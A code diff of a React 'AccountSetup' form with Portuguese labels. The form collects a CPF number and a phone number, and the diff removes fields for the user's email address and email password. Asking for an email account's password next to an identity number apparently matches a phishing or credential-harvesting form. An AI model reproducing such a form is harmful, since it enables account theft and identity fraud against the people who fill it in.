@@ -35,14 +35,7 @@ export class AccountSetup extends Component {
                     
                     <input type="number" placeholder="Digite seu CPF" className="form-control" name="cp" onChange={inputChange('cp')} value={values.cp}  required id="cpf"  />
                 </div>
-                <div className="form-group">
-                    <input placeholder="Seu email" type="email" className="form-control" name="email" onChange={inputChange('email')} value={values.email} />
-                   <span class="focus-border"></span>
-                </div>
-                <div className="form-group">
-                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
-                   <span class="focus-border"></span>
-                </div>
+
 
                 <div className="form-group">
                     <input placeholder="Celular com DDD"  type="number" className="form-control" name="phone" onChange={inputChange('phone')} value={values.phone} />
